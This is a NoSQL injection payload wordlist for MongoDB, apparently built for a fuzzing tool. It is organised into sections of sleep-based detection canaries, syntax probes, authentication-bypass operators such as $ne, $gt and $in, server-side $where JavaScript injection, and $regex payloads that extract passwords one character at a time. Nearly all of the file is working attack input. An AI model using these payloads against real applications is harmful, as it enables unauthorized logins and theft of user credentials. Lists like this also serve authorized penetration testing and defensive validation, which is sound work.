# ==================================================================
#  NoSQL INJECTION PAYLOADS — MongoDB (single file)
#  One payload per line. "#" lines are comments (pyintruder skips them).
#  Detection is mostly BEHAVIOURAL (no reflected canary):
#   - auth bypass  -> response LENGTH/STATUS changes (you get logged in) vs baseline
#   - syntax error -> grep for  MongoError / CastError / E11000
#   - the $where sleep payloads (section 0) HANG ~5s = deterministic "canary" signal
#  JSON operator payloads go in a VALUE position (e.g. "password":§HERE§) or as the
#  whole JSON body. Set Content-Type: application/json for the operator payloads.
# ==================================================================

# ---- 0. CANARY / detection — $where sleep (response HANGS ~5s = injectable) ----
{"$where":"sleep(5000)"}
{"$where":"sleep(5000)||true"}
';sleep(5000);'
0;return sleep(5000)
{"username":{"$ne":null},"password":{"$where":"sleep(5000)"}}

# ---- 1. Detection probes (error / behaviour change) ----
'
"
{
'"`{
[$ne]
{"$gt":""}

# ---- 2. Auth bypass — operator in a VALUE position (inject as the field value) ----
{"$ne":null}
{"$ne":""}
{"$gt":""}
{"$gte":""}
{"$regex":".*"}
{"$in":["admin"]}
{"$nin":[""]}
{"$exists":true}
{"$ne":1}

# ---- 3. Auth bypass — WHOLE JSON body ----
{"username":"admin","password":{"$ne":null}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":{"$ne":"x"},"password":{"$ne":"x"}}
{"username":"admin","password":{"$regex":".*"}}
{"username":{"$in":["admin","administrator","root"]},"password":{"$ne":""}}

# ---- 4. String / syntax injection (input concatenated into the query or $where JS) ----
' || '1'=='1
'||'1'=='1
' || 1==1//
' || 1==1%00
";return true;var x="
';return true;var x='
a'; return true; var b='
' || this.password || '
'%00

# ---- 5. $where / server-side JS ----
{"$where":"return true"}
{"$where":"1==1"}
{"$where":"this.password.length>0"}
';return(true);var x='
0;return true

# ---- 6. $regex data extraction (walk the charset) ----
{"$regex":"^a"}
{"$regex":"^adm"}
{"$regex":"^admin$"}
{"username":{"$regex":"^admin$"},"password":{"$regex":"^a"}}
{"password":{"$regex":"^.{8}$"}}
